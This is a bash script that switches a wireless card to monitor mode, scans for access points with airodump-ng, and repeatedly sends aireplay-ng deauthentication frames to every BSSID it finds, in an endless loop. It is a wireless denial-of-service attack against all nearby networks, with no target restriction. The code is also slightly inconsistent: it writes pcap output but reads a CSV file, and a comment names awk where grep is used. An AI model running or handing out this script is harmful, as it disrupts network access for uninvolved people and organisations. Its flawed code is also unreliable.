#!/bin/bash

# Set wlan1 to monitor mode
sudo ip link set wlan1 down
sudo iw dev wlan1 set type monitor
sudo ip link set wlan1 up

# Start scanning all channels and capturing packets
sudo airodump-ng --write capture --output-format pcap wlan1 &

# Wait for a few seconds to populate the list of networks
sleep 5

# Loop through detected BSSIDs and deauth them
while true; do
    # Use awk to extract BSSIDs from the airodump-ng output
    for BSSID in $(grep -oE '([A-F0-9]{2}:){5}[A-F0-9]{2}' capture-01.csv); do
        echo "Deauthenticating $BSSID"
        sudo aireplay-ng --deauth 10 -a "$BSSID" wlan1
        sleep 1  # Wait a moment before moving to the next BSSID
    done
    sleep 30  # Repeat every 30 seconds
done